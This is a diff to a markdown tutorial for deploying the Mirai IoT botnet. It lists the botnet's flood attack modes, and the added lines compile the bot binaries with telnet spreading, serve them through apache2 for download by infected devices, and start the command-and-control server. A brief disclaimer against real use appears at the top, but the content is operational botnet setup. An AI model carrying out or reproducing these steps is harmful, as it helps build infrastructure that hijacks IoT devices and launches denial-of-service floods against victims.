@@ -14,7 +14,7 @@ But a disclaimer at the beginning: Do not use this to actually attack somebody i
 ### First we need to install some packages  
 
 ```
-sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 -y
+sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
 ```
 <br>
 
@@ -121,4 +121,25 @@ syn: SYN flood
 ack: ACK flood
 udpplain: UDP flood with less options. optimized for higher PPS
 http: HTTP flood
+```
+<br>
+
+### But wait there is more
+We didn't see how to attack iot devices yet but first of all we need to compile the release binary's:
+```
+bash ./build.sh release telnet
+```
+<br>
+
+Let's install the binary's to apache2:
+```
+cd release
+bash ../apache2.sh
+```
+<br>
+
+Now lets run the cnc:
+```
+cd release
+sudo screen -dmS mirai-cnc ./cnc
 ```
